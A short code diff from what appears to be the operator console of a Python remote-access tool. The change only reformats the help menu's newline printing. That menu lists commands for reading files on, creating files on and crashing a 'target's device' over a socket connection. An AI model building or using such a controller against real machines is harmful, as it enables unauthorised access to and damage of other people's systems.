@@ -16,14 +16,12 @@ try:
         command = input(str("Enter your command :- "))
 
         if command == "help":
-            print("")
-            print('sysinfo        "Information about targets device"')
+            print('\nsysinfo        "Information about targets device"')
             print('pwd            "Get path of your file"')
             print('create         "Create a file in targets device"')
             print('ls             "Show all files and folders in specific path"')
             print('read           "Read a file in specific path"')
-            print('crash          "Crash targets device"')
-            print("")
+            print('crash          "Crash targets device"\n')
 
         elif command == "sysinfo":
             conn.send(command.encode())
